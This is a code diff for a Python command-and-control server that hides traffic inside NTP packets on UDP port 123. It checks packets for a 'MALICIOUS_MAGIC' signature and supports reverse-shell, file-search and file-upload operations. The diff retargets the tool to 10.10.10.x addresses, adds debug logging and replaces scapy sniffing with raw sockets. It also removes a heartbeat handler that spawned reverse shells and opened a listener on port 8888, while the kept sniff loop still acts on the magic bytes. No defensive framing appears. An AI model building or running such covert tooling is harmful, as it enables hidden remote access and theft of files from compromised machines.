@@ -11,6 +11,7 @@ Features:
     3. File Upload (GUI Dialog Selection)
   - Multi-Client Support
   - Spoofing Support
+  - Debug Mode (Verbose Logging)
 """
 
 import sys
@@ -27,10 +28,10 @@ from tkinter import Tk, filedialog
 from scapy.all import sniff, IP, UDP, NTP
 
 # === CONFIGURATION ===
-TARGET_RANGE = "10.10.10.0/24"  # Auto-detect range (e.g., "192.168.230.0/24")
-INTERFACE = "eth0"              # Fallback (if no range found)
-SERVER_HOST = "192.168.230.1"   # Client expects to connect to this IP
-SERVER_IP = "192.168.230.1"     # Server responds from this IP (or spoofed)
+TARGET_RANGE = "10.10.10.0/24"
+INTERFACE = "eth0"              # Fallback
+SERVER_HOST = "10.10.10.50"
+SERVER_IP = "10.10.10.69"
 NTP_PORT = 123
 SLEEP = 0.1
 CHUNK_SIZE = 48
@@ -202,7 +203,6 @@ def auto_detect_interface(target_range="10.10.10.0/24", timeout=5):
             ipv4_addrs = addrs.get(2, [])
             
             if ipv4_addrs:
-                # Extract IPs from dict
                 ips = [addr['addr'] for addr in ipv4_addrs if 'addr' in addr]
                 if ips:
                     ip_address = ips[0]
@@ -215,7 +215,6 @@ def auto_detect_interface(target_range="10.10.10.0/24", timeout=5):
                     sock.bind((ip_address, NTP_PORT))
                     
                     # 2. Send a packet to a reachable IP in the target range
-                    # Use the first IP in the network (e.g., 10.10.10.1)
                     target_ip = f"{list(ipaddress.IPv4Network(target_range).network_address)}.{1}"
                     
                     # 3. Send a small packet
@@ -227,67 +226,11 @@ def auto_detect_interface(target_range="10.10.10.0/24", timeout=5):
         except socket.timeout:
             continue
         except Exception as e:
+            print(f"  [!] Error: {e}")
             continue
     
     print(f"[-] No active interface found for {target_range}, using default: {INTERFACE}")
     return INTERFACE
-
-# === HEARTBEAT HANDLER ===
-def handle_heartbeat(ip_source, ip_dest, raw_data, src_port, dst_port, type_byte, src_type):
-    """Process the heartbeat and trigger the appropriate handler"""
-    try:
-        raw_bytes = raw_data[:48]
-        if len(raw_bytes) < 7:
-            return
-        
-        if raw_bytes[1:7] == MALICIOUS_MAGIC:
-            type_data = raw_bytes[7:13]
-            type_str = type_data.decode().strip()
-            print(f"[+] Received Type: {type_str}")
-            
-            if type_str == "ReverseShell":
-                print("[+] Handling ReverseShell...")
-                spawn_reverse_shell(ip_source, ip_dest)
-                ack = pack_ntp_resp(MAGIC_BYTE, b"READY")
-                send_udp_packet(ack, ip_source, ip_dest, src_port)
-                
-            elif type_str == "FileSearch":
-                print("[+] Handling FileSearch...")
-                cmd = raw_data[:48]
-                cmd = cmd.decode().strip()
-                
-                if cmd:
-                    search_queue.put((cmd, ip_source, ip_dest, NTP_PORT))
-                    ack = pack_ntp_resp(MAGIC_BYTE, b"QUEUED")
-                else:
-                    ack = pack_ntp_resp(MAGIC_BYTE, b"READY")
-                
-                send_udp_packet(ack, ip_source, ip_dest, src_port)
-                
-            elif type_str == "FileUpload":
-                print("[+] Handling FileUpload...")
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                sock.bind(("0.0.0.0", 8888))
-                sock.listen(5)
-                print(f"[+] Server Listening: 0.0.0.0:8888")
-                ack = pack_ntp_resp(MAGIC_BYTE, b"LISTENING")
-                send_udp_packet(ack, ip_source, ip_dest, src_port)
-                
-            else:
-                print(f"[-] Unknown Type: {type_str}")
-                ack = pack_ntp_resp(MAGIC_BYTE, b"UNKNOWN")
-                send_udp_packet(ack, ip_source, ip_dest, src_port)
-        
-        else:
-            print(f"[-] No Magic Signature")
-            ack = pack_ntp_resp(MAGIC_BYTE, b"NO_MAGIC")
-            send_udp_packet(ack, ip_source, ip_dest, src_port)
-    
-    except Exception as e:
-        print(f"[-] Handle Error: {e}")
-    finally:
-        time.sleep(SLEEP)
 
 # === MAIN LOOP ===
 def sniff_loop(interface, filter_str, timeout=5):
@@ -298,13 +241,29 @@ def sniff_loop(interface, filter_str, timeout=5):
     
     while True:
         try:
-            packet = sniff(iface=interface, filter=filter_str, count=1, timeout=timeout, verbose=0)
-            if packet:
-                ntp_pkt = packet[0][NTP]
-                ip_pkt = packet[0][IP]
+            # 1. Create raw socket for sniffing (more control)
+            print(f"[+] Creating raw socket for {interface}...")
+            try:
+                # Try to use AF_PACKET (Linux) or AF_INET (fallback)
+                if interface != "lo":
+                    # Linux: Use AF_PACKET for raw capture
+                    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(123))  # UDP port 123
+                else:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                    sock.bind((SERVER_HOST, NTP_PORT))
+                    
+                # 2. Set timeout for sniffing
+                sock.settimeout(timeout)
                 
+                # 3. Sniff packet
+                packet = sock.recvfrom(65535)  # 64KB buffer
+                ntp_pkt, src_ip = packet
+                
+                # 4. Check Magic Byte
                 raw = scapy.raw(ntp_pkt)
                 if raw[1:7] == MALICIOUS_MAGIC:
+                    # 5. Receive Payload Type
                     connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     connection.bind((SERVER_HOST, NTP_PORT))
                     
@@ -330,8 +289,20 @@ def sniff_loop(interface, filter_str, timeout=5):
                     
                     connection.send(pack_ntp_resp(MAGIC_BYTE, b"\x00"))
         
+        except socket.timeout:
+            print(f"[+] Timeout. Waiting for next packet...")
+            time.sleep(SLEEP)
         except Exception as e:
             print(f"[-] Sniff Error: {e}")
+            # Try to reconnect
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                sock.bind((SERVER_HOST, NTP_PORT))
+                sock.settimeout(timeout)
+            except Exception as e2:
+                print(f"  [!] Reconnect Error: {e2}")
+                time.sleep(SLEEP)
         finally:
             time.sleep(SLEEP)
 
